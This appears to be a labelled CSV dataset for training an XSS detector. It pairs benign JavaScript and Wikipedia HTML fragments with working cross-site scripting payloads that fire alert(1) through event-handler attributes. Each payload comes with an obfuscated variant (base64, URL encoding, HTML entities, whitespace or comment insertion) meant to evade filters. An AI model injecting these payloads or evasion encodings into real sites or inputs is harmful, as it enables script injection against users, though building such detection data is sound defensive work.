payload_original,payload_obfuscated,label,technique
<span onpointerup=alert(1)>xss</span>,%3Cspan%20onpointerup%3Dalert%281%29%3Exss%3C%2Fspan%3E,1,urlencode
"this._setattributeifnotexists(outerelem, 'role', 'presentation') } if (!isactive) {","this._setattributeifnotexists(outerelem, 'role', 'presentation') } if (!isactive) {",0,none
<tr id=x tabindex=1 onfocus=alert(1)></tr>,<tr id=x tabindex/*OBF*/=1 onfocus=alert(1)></tr>,1,comment_marker
} else if ($target.closest('.month-prev').length) { this.prevmonth(); } else if ($target.closest('.month-next').length) {,} else if ($target.closest('.month-prev').length) { this.prevmonth(); } else if ($target.closest('.month-next').length) {,0,none
"_classcallcheck(this, carousel); var _this62 = _possibleconstructorreturn(this, (carousel.__proto__ || object.getprototypeof(carousel)).call(this, carousel, el, options)); _this62.el.m_carousel = _this62;","_classcallcheck(this, carousel); var _this62 = _possibleconstructorreturn(this, (carousel.__proto__ || object.getprototypeof(carousel)).call(this, carousel, el, options)); _this62.el.m_carousel = _this62;",0,none
}); } $collapsibleli[0].classlist.add('active');,}); } $collapsibleli[0].classlist.add('active');,0,none
"target.classlist.add(class_name_active) this._activateparents(target) eventhandler.trigger(this._element, event_activate, { relatedtarget: target })","target.classlist.add(class_name_active) this._activateparents(target) eventhandler.trigger(this._element, event_activate, { relatedtarget: target })",0,none
"<style>@keyframes x{}</style><dir style=""animation-name:x"" onanimationstart=""alert(1)""></dir>","<style>@keyframes x{}</ style><dir style= ""animation-name:x"" onanimationstart=""alert(1)""><  /dir>",1,whitespace_noise
do { prefix += math.floor(math.random() * max_uid) } while (document.getelementbyid(prefix)),do { prefix += math.floor(math.random() * max_uid) } while (document.getelementbyid(prefix)),0,none
"<li><a href=""/wiki/very_large_scale_integration"" title=""very large scale integration"">very large scale integration </a> </li>","<li><a href=""/wiki/very_large_scale_integration"" title=""very large scale integration"">very large scale integration </a> </li>",0,none
"<footer onmousedown=""alert(1)"">test</footer>","<footer onmousedown=""alert(1)""  >test</footer>",1,whitespace_noise
"<tbody onkeydown=""alert(1)"" contenteditable>test</tbody>","<tbody onkeydown="" alert(1)"" contenteditable>  test</tbody>",1,whitespace_noise
"<br onkeyup=""alert(1)"" contenteditable>test</br>",&lt;br onkeyup=&quot;alert(1)&quot; contenteditable&gt;test&lt;/br&gt;,1,html_entities
"<p>ai has developed many tools to solve the most difficult problems in <a href=""/wiki/computer_science"" title=""computer science"">computer science </a>. a few of the most general of these methods are discussed below.","<p>ai has developed many tools to solve the most difficult problems in <a href=""/wiki/computer_science"" title=""computer science"">computer science </a>. a few of the most general of these methods are discussed below.",0,none
offset } = this._config; if (typeof offset === 'string') {,offset } = this._config; if (typeof offset === 'string') {,0,none
"<isindex draggable=""true"" ondragenter=""alert(1)"">test</isindex>",PGlzaW5kZXggZHJhZ2dhYmxlPSJ0cnVlIiBvbmRyYWdlbnRlcj0iYWxlcnQoMSkiPnRlc3Q8L2lzaW5kZXg+,1,base64
const elements = selectorengine.focusablechildren(trapelement) if (elements.length === 0) { trapelement.focus(),const elements = selectorengine.focusablechildren(trapelement) if (elements.length === 0) { trapelement.focus(),0,none
return template; } _typecheckconfig(config) {,return template; } _typecheckconfig(config) {,0,none
".find('li') .removeclass('selected'); $(optionel).toggleclass('selected', selected);",".find('li') .removeclass('selected'); $(optionel).toggleclass('selected', selected);",0,none
return } element.classlist.add(class_name_active),return } element.classlist.add(class_name_active),0,none
scalefactor = windowwidth / backdrop[0].clientwidth; this.btnbottom = btnrect.bottom; this.btnleft = btnrect.left;,scalefactor = windowwidth / backdrop[0].clientwidth; this.btnbottom = btnrect.bottom; this.btnleft = btnrect.left;,0,none
import eventhandler from '../dom/event-handler.js' import selectorengine from '../dom/selector-engine.js' import config from './config.js',import eventhandler from '../dom/event-handler.js' import selectorengine from '../dom/selector-engine.js' import config from './config.js',0,none
<th onpointerleave=alert(1)>xss</th>,PHRoIG9ucG9pbnRlcmxlYXZlPWFsZXJ0KDEpPnhzczwvdGg+,1,base64
"<style>:target {color: red;}</style><em id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></em>",PHN0eWxlPjp0YXJnZXQge2NvbG9yOiByZWQ7fTwvc3R5bGU+PGVtIGlkPXggc3R5bGU9InRyYW5zaXRpb246Y29sb3IgMTBzIiBvbnRyYW5zaXRpb25jYW5jZWw9YWxlcnQoMSk+PC9lbT4=,1,base64
<data onpointerleave=alert(1)>xss</data>,%3Cdata%20onpointerleave%3Dalert%281%29%3Exss%3C%2Fdata%3E,1,urlencode
const callable = isdelegated ? delegationfunction : handler || delegationfunction; let typeevent = gettypeevent(originaltypeevent); if (!nativeevents.has(typeevent)) {,const callable = isdelegated ? delegationfunction : handler || delegationfunction; let typeevent = gettypeevent(originaltypeevent); if (!nativeevents.has(typeevent)) {,0,none
animoptions.translatex = -100; } anim(animoptions);,animoptions.translatex = -100; } anim(animoptions);,0,none
this.originalwidth = this.el.getboundingclientrect().width,this.originalwidth = this.el.getboundingclientrect().width,0,none
"<td onkeypress=""alert(1)"" contenteditable>test</td>",%3Ctd%20onkeypress%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Ftd%3E,1,urlencode
var resultdiv = $('<a href=' + result[1] + '>' + result[0] + '</a>'); resultscontainer.append(resultdiv); });,var resultdiv = $('<a href=' + result[1] + '>' + result[0] + '</a>'); resultscontainer.append(resultdiv); });,0,none
"<acronym oncut=""alert(1)"" contenteditable>test</acronym>",PGFjcm9ueW0gb25jdXQ9ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGU+dGVzdDwvYWNyb255bT4=,1,base64
m.timepicker = timepicker,m.timepicker = timepicker,0,none
calendar.month += 12,calendar.month += 12,0,none
<img src=validimage.png onloadend=alert(1)>,PGltZyBzcmM9dmFsaWRpbWFnZS5wbmcgb25sb2FkZW5kPWFsZXJ0KDEpPg==,1,base64
"<style>@keyframes slidein {}</style><cite style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></cite>","<style>@keyframes slidein {}</  style><cite style=""animation-duration:1s;  animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""> </cite>",1,whitespace_noise
}); if (this.showindicators) { this.$el.append(this.$indicators);,}); if (this.showindicators) { this.$el.append(this.$indicators);,0,none
<shadow onpointerenter=alert(1)>xss</shadow>,<shadow onpointerenter=  alert(1)>xss</  shadow>  ,1,whitespace_noise
"<style>:target {color: red;}</style><details id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></details>",%3Cstyle%3E%3Atarget%20%7Bcolor%3A%20red%3B%7D%3C%2Fstyle%3E%3Cdetails%20id%3Dx%20style%3D%22transition%3Acolor%2010s%22%20ontransitioncancel%3Dalert%281%29%3E%3C%2Fdetails%3E,1,urlencode
"_classcallcheck(this, taptarget)","_classcallcheck(this, taptarget)",0,none
"<data onmouseenter=""alert(1)"">test</data>","<  data onmouseenter=""alert(1)  "">test</data>  ",1,whitespace_noise
this._deltax = 0 this._supportpointerevents = boolean(window.pointerevent) this._initevents(),this._deltax = 0 this._supportpointerevents = boolean(window.pointerevent) this._initevents(),0,none
"<style draggable=""true"" ondragleave=""alert(1)"">test</style>",%3Cstyle%20draggable%3D%22true%22%20ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fstyle%3E,1,urlencode
} } return elementisvisible;,} } return elementisvisible;,0,none
<nav onpointerenter=alert(1)>xss</nav>,%3Cnav%20onpointerenter%3Dalert%281%29%3Exss%3C%2Fnav%3E,1,urlencode
"<iframe onmouseup=""alert(1)"">test</iframe>",&lt;iframe onmouseup=&quot;alert(1)&quot;&gt;test&lt;/iframe&gt;,1,html_entities
_this35._handlewindowscroll(); return _this35; },_this35._handlewindowscroll(); return _this35; },0,none
}; }; spectrum.prototype.countstepdecimals = function () {,}; }; spectrum.prototype.countstepdecimals = function () {,0,none
"<div draggable=""true"" contenteditable>drag me</div><tfoot ondrop=alert(1) contenteditable>drop here</tfoot>",&lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;tfoot ondrop=alert(1) contenteditable&gt;drop here&lt;/tfoot&gt;,1,html_entities
<svg><discard onbegin=alert(1)>,<svg><discard onbegin=alert(1)>,1,comment_marker
return new focustrap({ trapelement: this._element }),return new focustrap({ trapelement: this._element }),0,none
this.tabswidth = this.$el.width(),this.tabswidth = this.$el.width(),0,none
"<bgsound draggable=""true"" ondragend=""alert(1)"">test</bgsound>",PGJnc291bmQgZHJhZ2dhYmxlPSJ0cnVlIiBvbmRyYWdlbmQ9ImFsZXJ0KDEpIj50ZXN0PC9iZ3NvdW5kPg==,1,base64
"<a href=""http://66.102.7.147/""></a>",PGEgaHJlZj0iaHR0cDovLzY2LjEwMi43LjE0Ny8iPjwvYT4=,1,base64
"<iframe onbeforecopy=""alert(1)"" contenteditable>test</iframe>","<iframe onbeforecopy=""alert(1)"" contenteditable>test</iframe>",1,whitespace_noise
const event_pointerup = `pointerup${event_key$9}`; const pointer_type_touch = 'touch'; const pointer_type_pen = 'pen';,const event_pointerup = `pointerup${event_key$9}`; const pointer_type_touch = 'touch'; const pointer_type_pen = 'pen';,0,none
const selector_nav_items = '.nav-item',const selector_nav_items = '.nav-item',0,none
const event_keydown_data_api = `keydown${event_key$6}${data_api_key$3}`,const event_keydown_data_api = `keydown${event_key$6}${data_api_key$3}`,0,none
"<style>:target {color:red;}</style><mark id=x style=""transition:color 1s"" ontransitionend=alert(1)></mark>","<style>  :target {color:red;}</style><mark id=x style=""transition:color 1s"" ontransitionend=alert( 1)></ mark>",1,whitespace_noise
} domcontentloadedcallbacks.push(callback); } else {,} domcontentloadedcallbacks.push(callback); } else {,0,none
"<style>@keyframes x{}</style><details style=""animation-name:x"" onanimationstart=""alert(1)""></details>","<style>@keyframes x{}</style><details s/*OBF*/tyl/*OBF*/e=""ani/*OBF*/mation-name:x"" onanimationstart=""alert(1)""></details>",1,comment_marker
this.yeartextel = this.modalel.queryselector('.year-text'),this.yeartextel = this.modalel.queryselector('.year-text'),0,none
"</span> <span class=""reference-text""><a href=""#citerefnorvig2012"">norvig 2012 </a>.","</span> <span class=""reference-text""><a href=""#citerefnorvig2012"">norvig 2012 </a>.",0,none
"<center ondblclick=""alert(1)"">test</center>","<center ondblclick=""alert(1) "">test</center>",1,whitespace_noise
"<style>@keyframes x{}</style><meter style=""animation-name:x"" onanimationend=""alert(1)""></meter>","<style>@keyframes x{}</style><meter style=""animation-name:x"" onanimationend=""ale/*OBF*/rt(1)""></meter/*OBF*/>",1,comment_marker
if (_this18.attrheight) {,if (_this18.attrheight) {,0,none
"<textarea onmouseleave=""alert(1)"">test</textarea>",%3Ctextarea%20onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Ftextarea%3E,1,urlencode
"<font onkeyup=""alert(1)"" contenteditable>test</font>","<font onkeyup=""alert(  1)"" contenteditable>test</font>",1,whitespace_noise
"<font onmousemove=""alert(1)"">test</font>",PGZvbnQgb25tb3VzZW1vdmU9ImFsZXJ0KDEpIj50ZXN0PC9mb250Pg==,1,base64
"<div id=""p-logo"" role=""banner"">","<div id=""p-logo"" role=""banner"">",0,none
const relatedtarget = {,const relatedtarget = {,0,none
"<style>@keyframes x{}</style><rp style=""animation-name:x"" onanimationstart=""alert(1)""></rp>","<style>@keyframes x{}</style><rp sty/*OBF*/le=""animation-name:x"" onanimationstart=""a/*OBF*/lert(1)""></rp>",1,comment_marker
dist: { files: { 'dist/js/materialize.min.js': ['dist/js/materialize.js'],dist: { files: { 'dist/js/materialize.min.js': ['dist/js/materialize.js'],0,none
"<img onmouseenter=""alert(1)"">test</img>",&lt;img onmouseenter=&quot;alert(1)&quot;&gt;test&lt;/img&gt;,1,html_entities
multi-agent planning and emergent behavior:,multi-agent planning and emergent behavior:,0,none
this._calculatepositioning(); this._setupeventhandlers(); },this._calculatepositioning(); this._setupeventhandlers(); },0,none
parsed.tooltips.push(true),parsed.tooltips.push(true),0,none
if (opts.isdisabled) { arr.push('is-disabled'); },if (opts.isdisabled) { arr.push('is-disabled'); },0,none
for (const carousel of carousels) {,for (const carousel of carousels) {,0,none
"m.updatetextfields(); }); $(document).on('reset', function(e) {","m.updatetextfields(); }); $(document).on('reset', function(e) {",0,none
"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 18.2 </li> </ul>","<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 18.2 </li> </ul>",0,none
}; m.getoverflowparent = function (element) { if (element == null) {,}; m.getoverflowparent = function (element) { if (element == null) {,0,none
<bgsound onpointerleave=alert(1)>xss</bgsound>,<  bgsound onpointerleave=alert(1)>xss< /bgsound>,1,whitespace_noise
$activelis.each(function (el) { var index = $collapsiblelis.index($(el)); _this8.close(index);,$activelis.each(function (el) { var index = $collapsiblelis.index($(el)); _this8.close(index);,0,none
"key: ""_renderchips"", value: function _renderchips() { this.$chips.remove();","key: ""_renderchips"", value: function _renderchips() { this.$chips.remove();",0,none
"<div draggable=""true"" contenteditable>drag me</div><bdo ondragover=alert(1) contenteditable>drop here</bdo>",PGRpdiBkcmFnZ2FibGU9InRydWUiIGNvbnRlbnRlZGl0YWJsZT5kcmFnIG1lPC9kaXY+PGJkbyBvbmRyYWdvdmVyPWFsZXJ0KDEpIGNvbnRlbnRlZGl0YWJsZT5kcm9wIGhlcmU8L2Jkbz4=,1,base64
"} subclass.prototype = object.create(superclass && superclass.prototype, { constructor: { value: subclass, enumerable: false, writable: true, configurable: true } })","} subclass.prototype = object.create(superclass && superclass.prototype, { constructor: { value: subclass, enumerable: false, writable: true, configurable: true } })",0,none
this.isopen = false; this.modal.close(); },this.isopen = false; this.modal.close(); },0,none
"<li id=""cite_note-305""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-305"">^ </a> </b>","<li id=""cite_note-305""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-305"">^ </a> </b>",0,none
} to = options.format.from(to); if ( to !== false && !isnan(to) ) {,} to = options.format.from(to); if ( to !== false && !isnan(to) ) {,0,none
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figcaption>","<style> @keyframes x{from {left:0; }to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=  x style=""position:absolute;"" onanimationcancel=""alert(1)""> </figcaption>  ",1,whitespace_noise
"<script oncopy=""alert(1)"" contenteditable>test</script>","<script oncopy=""alert(1) "" contenteditable>test</script>  ",1,whitespace_noise
"<big ondblclick=""alert(1)"">test</big>",%3Cbig%20ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fbig%3E,1,urlencode
} _isanimated() { return this._config.animation || (this.tip && this.tip.classlist.contains(class_name_fade)),} _isanimated() { return this._config.animation || (this.tip && this.tip.classlist.contains(class_name_fade)),0,none
"let registry = { autocomplete: root.queryselectorall('.autocomplete:not(.no-autoinit)'), carousel: root.queryselectorall('.carousel:not(.no-autoinit)'),","let registry = { autocomplete: root.queryselectorall('.autocomplete:not(.no-autoinit)'), carousel: root.queryselectorall('.carousel:not(.no-autoinit)'),",0,none
"<li id=""cite_note-377""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-377"">^ </a> </b>","<li id=""cite_note-377""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-377"">^ </a> </b>",0,none
<time id=x tabindex=1 onbeforedeactivate=alert(1)></time><input autofocus>,<time id=x tabindex=1 onbe/*OBF*/foredeactivate=alert(1)></tim/*OBF*/e><input autofocus>,1,comment_marker
"instance[methodoroptions].apply(instance, params)","instance[methodoroptions].apply(instance, params)",0,none
"<tt draggable=""true"" ondragenter=""alert(1)"">test</tt>",PHR0IGRyYWdnYWJsZT0idHJ1ZSIgb25kcmFnZW50ZXI9ImFsZXJ0KDEpIj50ZXN0PC90dD4=,1,base64
"<style>:target {color:red;}</style><noscript id=x style=""transition:color 1s"" ontransitionend=alert(1)></noscript>","<style>:target {color:red;}</ style>  <noscript id=x style=""transition:color 1s"" ontransitionend= alert(1)></noscript>",1,whitespace_noise
